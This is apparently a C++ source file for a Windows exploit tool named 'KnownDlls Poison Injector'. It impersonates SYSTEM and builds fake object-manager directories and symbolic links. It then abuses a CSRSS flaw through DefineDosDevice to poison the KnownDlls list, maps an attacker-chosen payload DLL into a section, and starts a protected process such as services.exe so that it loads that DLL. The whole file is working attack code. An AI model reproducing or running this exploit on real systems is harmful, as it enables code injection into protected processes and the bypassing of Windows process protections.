#include <iostream>
#include <windows.h>
#include <AclAPI.h>
#include "ImpersonateToken/hijackToken.h"

_Success_(return)
BOOL FindFileForTransaction(_In_ DWORD dwMinSize, _Out_ LPWSTR * ppwszFilePath)
{
	BOOL bReturnValue = FALSE;

	WCHAR wszSearchPath[MAX_PATH] = { 0 };
	WCHAR wszFilePath[MAX_PATH] = { 0 };
	WIN32_FIND_DATA wfd = { 0 };
	HANDLE hFind = NULL;

	HANDLE hFile = NULL;
	PSID pSidOwner = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	DWORD dwFileSize = 0;

	PSID pSidTarget = NULL;

	ConvertStringSidToSid(L"S-1-5-18", &pSidTarget);

	GetSystemDirectory(wszSearchPath, MAX_PATH);			// C:\Windows\System32
	StringCchCat(wszSearchPath, MAX_PATH, L"\\*.dll");		// C:\Windows\System32\*.dll

	if ((hFind = FindFirstFileW(wszSearchPath, &wfd)) != INVALID_HANDLE_VALUE)
	{
		do
		{
			GetSystemDirectory(wszFilePath, MAX_PATH);
			StringCchCat(wszFilePath, MAX_PATH, L"\\");
			StringCchCat(wszFilePath, MAX_PATH, wfd.cFileName);

			if (hFile = CreateFile(wszFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL))
			{
				dwFileSize = GetFileSize(hFile, NULL);
				if (dwFileSize != INVALID_FILE_SIZE && dwFileSize > dwMinSize)
				{
					if (GetSecurityInfo(hFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, &pSidOwner, NULL, NULL, NULL, &pSD) == ERROR_SUCCESS)
					{
						if (TokenCompareSids(pSidOwner, pSidTarget))
						{
							*ppwszFilePath = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
							if (*ppwszFilePath)
							{
								StringCchPrintf(*ppwszFilePath, MAX_PATH, L"%ws", wszFilePath);
								bReturnValue = TRUE;
							}
						}
					}
				}

				CloseHandle(hFile);
			}

		} while (FindNextFileW(hFind, &wfd) && !bReturnValue);

		FindClose(hFind);
	}

	return bReturnValue;
}

_Success_(return)
BOOL MapDll(_In_ LPWSTR dllFileToMap, _In_ LPWSTR pwszSectionName, _Out_ PHANDLE phSection)
{
	BOOL bReturnValue = FALSE;

	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING sectionName = { 0 };
	NTSTATUS status = 0;
	HANDLE hSection = NULL;

	HANDLE hDllTransacted = CreateFile(dllFileToMap, GENERIC_READ, 0, NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	RtlInitUnicodeString(&sectionName, pwszSectionName);
	InitializeObjectAttributes(&oa, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//
	// According to the documentation, the SEC_IMAGE attribute must be combined with the page 
	// protection value PAGE_READONLY. But the page protection has actually no effect because the 
	// page protection is determined by the executable file itself.
	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
	//
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, NULL, PAGE_READONLY, SEC_IMAGE, hDllTransacted);
	if (status != STATUS_SUCCESS)
	{
		SetLastError(RtlNtStatusToDosError(status));
		PrintLastError(L"NtCreateSection");
		goto end;
	}

	*phSection = hSection;
	bReturnValue = TRUE;

end:
	if (hDllTransacted)
		CloseHandle(hDllTransacted);

	return bReturnValue;
}


_Success_(return)
BOOL CreateProtectedProcessAsUser(_In_ HANDLE hToken, _In_ LPWSTR pwszCommandLine, _Out_ PHANDLE phProcess)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	HANDLE hProcess = NULL;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	if (!CreateProcessAsUser(hToken, NULL, pwszCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		PrintLastError(L"CreateProcessAsUser");
		return FALSE;
	}

	*phProcess = pi.hProcess;
	CloseHandle(pi.hThread);

	return TRUE;
}

int wmain(int argc, wchar_t **argv) {

	if (argc < 4) {
		printf("KnownDlls Poison Injector by aaaddress1@chroot.org\n");
		printf("Usage: ./knownDlls_Poison [Target] [Payload] [Cmdline]\n");
		printf("  e.g. ./knownDlls_Poison EventAggregation.dll C:/payload.dll C:/Windows/System32/Services.exe argv1 argv2 dummy\n");
		return 0;
	}

	HANDLE hKnownDllsObjDir = NULL, hDllLink = NULL, hFakeGlobalrootLink = NULL, hSystemToken = NULL, hDllSection = NULL, hCurrentToken = NULL, hNewProcessToken = NULL, hNewProcess = NULL;
	WCHAR cmdlineToRun[4096]{ 0 };
	for (size_t i = 3; i < argc; i++, lstrcatW(cmdlineToRun, L"\x20")) lstrcatW(cmdlineToRun, argv[i]);

	// create a fake object directory.
	printf(" --- KnownDll Poisoning for PPL --- \n"); 
	if (FALSE == ImpersonateSystem(&hSystemToken)) return 0;
	if (!(hKnownDllsObjDir = ObjectManagerCreateDirectory(L"\\GLOBAL??\\KnownDlls"))) return 0;
	PrintDebug(L"[v] Created Object Directory \\GLOBAL??\\KnownDlls... OK!\n");

	// create fake link.
	auto pwszDllLinkName = new WCHAR[MAX_PATH + 1];
	auto pwszDllToHijack = argv[1];                  //L"EventAggregation.dll";
	StringCchPrintf(pwszDllLinkName, MAX_PATH, L"\\GLOBAL??\\KnownDlls\\%ws", pwszDllToHijack);
	if (!(hDllLink = ObjectManagerCreateSymlink(pwszDllLinkName, L"dummy"))) return 0;
	RevertToSelf();
	PrintDebug(L"[v] Create symbolic link %ws... OK\n", pwszDllLinkName);

	// let globalroot -> global??
	LPCWSTR pwszFakeGlobalrootLinkName = L"\\??\\GLOBALROOT";
	LPCWSTR pwszFakeGlobalrootLinkTarget = L"\\GLOBAL??";
	if (!(hFakeGlobalrootLink = ObjectManagerCreateSymlink(pwszFakeGlobalrootLinkName, pwszFakeGlobalrootLinkTarget))) return 0;
	PrintDebug(L"[v] Created symbolic link: '%ws -> %ws' ...OK\n", pwszFakeGlobalrootLinkName, pwszFakeGlobalrootLinkTarget);

	// abuse CSRSS flaw to create symlink in KnownDlls list
	auto pwszDosDeviceName = new WCHAR[MAX_PATH + 1];
	auto pwszDosDeviceTargetPath = new WCHAR[MAX_PATH + 1];
	StringCchPrintf(pwszDosDeviceName, MAX_PATH, L"GLOBALROOT\\KnownDlls\\%ws", pwszDllToHijack);
	StringCchPrintf(pwszDosDeviceTargetPath, MAX_PATH, L"\\KernelObjects\\%ws", pwszDllToHijack);
	if (!DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, pwszDosDeviceName, pwszDosDeviceTargetPath)) {
		PrintLastError(L"DefineDosDevice");
		return 0;
	}
	PrintDebug(L"[v] DefineDosDevice to create '\\KnownDlls\\%ws' -> '%ws' ...OK\n", pwszDllToHijack, pwszDosDeviceTargetPath);

	// mapping our dll into section.
	if (FALSE == ImpersonateSystem(&hSystemToken)) return 0;
	if (!MapDll(argv[2], pwszDosDeviceTargetPath, &hDllSection)) return 0;
	PrintDebug(L"[*] Mapped payload DLL to '%ws' ...OK\n", pwszDosDeviceTargetPath);

	// create the process!
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES, FALSE, &hCurrentToken)) {
		PrintLastError(L"OpenThreadToken");
		return 0;
	}
	if (!TokenCheckPrivilege(hCurrentToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE)) return 0;
	if (!DuplicateTokenEx(hCurrentToken, MAXIMUM_ALLOWED, NULL, SecurityAnonymous, TokenPrimary, &hNewProcessToken)) {
		PrintLastError(L"DuplicateTokenEx");
		return 0;
	}

	PrintDebug(L"Create PPL Process...\n");

	if (!CreateProtectedProcessAsUser(hNewProcessToken, cmdlineToRun, &hNewProcess)) return 0;

	PrintDebug(L"[*] Started protected process, waiting...\n");
	WaitForSingleObject(hNewProcess, INFINITE);
	return 0;
}
